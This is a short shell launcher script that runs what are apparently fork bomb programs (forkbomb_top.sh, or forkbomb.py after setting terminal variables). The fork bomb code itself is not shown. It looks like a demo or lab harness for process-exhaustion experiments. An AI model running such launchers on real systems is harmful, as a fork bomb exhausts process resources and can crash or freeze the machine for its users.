#!/bin/sh

if [ "$1" = "top" ];
then
  sh forkbomb/forkbomb_top.sh
else
  export TERM=linux
  export TERMINFO=/etc/terminfo
  python forkbomb/forkbomb.py
fi
